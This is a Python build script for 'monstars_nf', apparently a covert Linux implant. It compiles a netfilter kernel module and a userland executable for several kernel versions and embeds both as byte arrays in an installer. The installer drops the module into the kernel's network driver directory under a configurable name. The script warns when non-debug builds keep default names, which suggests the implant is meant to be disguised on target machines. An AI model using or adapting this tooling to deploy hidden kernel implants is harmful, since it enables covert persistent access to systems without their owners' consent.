"""Come on and SLAM! And welcome to the JAM!"""
import argparse
import glob
import os
import pathlib
import shutil
import subprocess

ROOT_DIR = pathlib.Path(__file__).parent
BUILD_DIR = ROOT_DIR / "build"
EXPORT_DIR = ROOT_DIR / "export"
INSTALLER_DIR = ROOT_DIR / "installer"
KERNEL_DIR = ROOT_DIR / "kernel"
USER_DIR = ROOT_DIR / "user"

EXE_NAME = "monstars"
INSTALLER_NAME = "go-monstars"

DEFAULT_KO_NAME = "monstars_nf"
DEFAULT_EXE_PATH = "/bin/monstars"

KO_PRECOMPILED_H = "ko_precompiled.h"
KO_CONST_NAME = "c_KernelMod"
KO_STAMP_MAGIC = b"BASKETBALLJONES"

USER_PRECOMPILED_H = "user_precompiled.h"
USER_CONST_NAME = "c_UserExe"

INSTALLER_STAMP_MAGIC_USER = b"BASKETBALLJONES"
INSTALLER_STAMP_MAGIC_KO = b"MORONMOUNTAIN"

KERNEL_VERSIONS = [
    # "2.6.32-754.el6.x86_64",
    "3.10.0-123.el7.x86_64",
    "3.10.0-327.el7.x86_64",
    "3.10.0-514.el7.x86_64",
    "3.11.0-12-generic",
    "3.13.0-24-generic",
    "4.4.0-21-generic",
    "4.15.0-20-generic",
    "4.15.0-122-generic",
    "4.15.0-123-generic",
]

KERNEL_C_FLAGS = {
    # "2": "-D__GNUC__=4 -fno-pie -Wno-pointer-sign -Wno-attributes -Wno-missing-attributes -mfentry",
    "3": "-D__GNUC__=4 -fno-pie -Wno-pointer-sign -Wno-attributes -Wno-missing-attributes -mfentry",
    "4": "-fno-pie -Wno-pointer-sign -Wno-attributes -mfentry",
}


def _stamp_binary(binary, stamp_pattern, stamp_data):
    """Stamp over a pattern in the binary data and return the result"""
    print(f"\n\n** Stamping over {stamp_pattern}")
    idx = binary.index(stamp_pattern)
    return binary.replace(binary[idx : idx + len(stamp_data) + 1], stamp_data + b"\x00")


def _generate_header(binary, dst_path, var_name):
    """Generate a header from a precompiled binary"""
    print(f"\n\n** Generating {dst_path}...")
    bin_str = bytes.hex(binary)
    arr_elems = [f"0x{bin_str[i:i+2]}" for i in range(0, len(bin_str), 2)]
    with open(dst_path, "w") as hdr:
        hdr.write(
            "/*\n"
            " *  This is a generated header file.\n"
            " */"
        )
        # char c_KernelMod[4944] = {0x7f, 0x45, 0x4c, 0x46, ... };
        hdr.write(
            "\n\n"
            f"char {var_name}[{len(arr_elems)}] = {{{', '.join(arr_elems)}}};"
        )


def run_build(kernel_ver, ko_name, exe_path, debug):
    """Build it!"""
    target = "debug" if debug else ""
    os.environ.update(
        {
            "KERNEL_VER": kernel_ver,
            "MOD": ko_name,
            "KFLAGS": KERNEL_C_FLAGS.get(kernel_ver[0], ""),
        }
    )
    # Clean up old build artifacts for this kernel
    if os.path.isdir(BUILD_DIR / kernel_ver):
        shutil.rmtree(BUILD_DIR / kernel_ver)
    os.makedirs(BUILD_DIR / kernel_ver, exist_ok=True)

    # Build kernel module
    print(f"\n\n** Building {ko_name}.ko for {kernel_ver}...\n")
    tempname = (ko_name != DEFAULT_KO_NAME)
    if tempname:
        shutil.copyfile(KERNEL_DIR / f"{DEFAULT_KO_NAME}.c", KERNEL_DIR / f"{ko_name}.c")
    subprocess.run(
        f"make {target}", cwd=KERNEL_DIR, shell=True
    )
    # Cleanup kbuild
    if tempname:
        os.unlink(KERNEL_DIR / f"{ko_name}.c")
    subprocess.run(
        "make clean", cwd=KERNEL_DIR, shell=True
    )
    # Stamp user exe path into kernel module binary
    with open(BUILD_DIR / kernel_ver / f"{ko_name}.ko", "rb") as f:
        kernel_bin = f.read()
    kernel_bin = _stamp_binary(kernel_bin, KO_STAMP_MAGIC, exe_path.encode("ascii"))

    # Build userland executable
    print(f"\n\n** Building user exe for {kernel_ver}...\n")
    subprocess.run(
        f"make {target}", cwd=USER_DIR, shell=True
    )
    with open(BUILD_DIR / kernel_ver / EXE_NAME, "rb") as f:
        user_bin = f.read()
    
    # Generate precompiled headers
    _generate_header(
        kernel_bin,
        BUILD_DIR / kernel_ver / KO_PRECOMPILED_H,
        KO_CONST_NAME,
    )
    _generate_header(
        user_bin,
        BUILD_DIR / kernel_ver / USER_PRECOMPILED_H,
        USER_CONST_NAME,
    )

    # Build installer executable
    print(f"\n\n** Building installer for {kernel_ver}...\n")
    subprocess.run(
        f"make {target}", cwd=INSTALLER_DIR, shell=True
    )
    # Stamp installer with user exe path and ko module path
    ko_path = f"/lib/modules/{kernel_ver}/kernel/drivers/net/{ko_name}.ko".encode("ascii")
    with open(BUILD_DIR / kernel_ver / INSTALLER_NAME, "rb") as f:
        installer_bin = f.read()
    installer_bin = _stamp_binary(installer_bin, INSTALLER_STAMP_MAGIC_KO, ko_path)
    installer_bin = _stamp_binary(installer_bin, INSTALLER_STAMP_MAGIC_USER, exe_path.encode("ascii"))

    # Copy installer to export directory
    installer_dest = EXPORT_DIR / f"{INSTALLER_NAME}_{kernel_ver}"
    os.makedirs(EXPORT_DIR, exist_ok=True)
    with open(installer_dest, "wb") as f:
        f.write(installer_bin)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Build a monstars_nf installer binary")
    parser.add_argument(
        "-d", "--debug",
        action="store_true",
        help="build components with debug symbols",
    )
    parser.add_argument(
        "-v", "--kernel-ver",
        default=KERNEL_VERSIONS[-1],
        choices=KERNEL_VERSIONS,
        help="linux kernel version to build against",
    )
    parser.add_argument(
        "-k", "--ko-name",
        default=DEFAULT_KO_NAME,
        help="name to use for the kernel netfilter module",
    )
    parser.add_argument(
        "-e", "--exe-path",
        default=DEFAULT_EXE_PATH,
        help="path to the userland executable",
    )
    args = parser.parse_args()
    if args.ko_name == DEFAULT_KO_NAME and not args.debug:
        print("*** WARNING: USED DEFAULT KO NAME FOR NON-DEBUG BUILD ***")
    if args.exe_path == DEFAULT_EXE_PATH and not args.debug:
        print("*** WARNING: USED DEFAULT EXE PATH FOR NON-DEBUG BUILD ***")
    run_build(args.kernel_ver, args.ko_name, args.exe_path, args.debug)
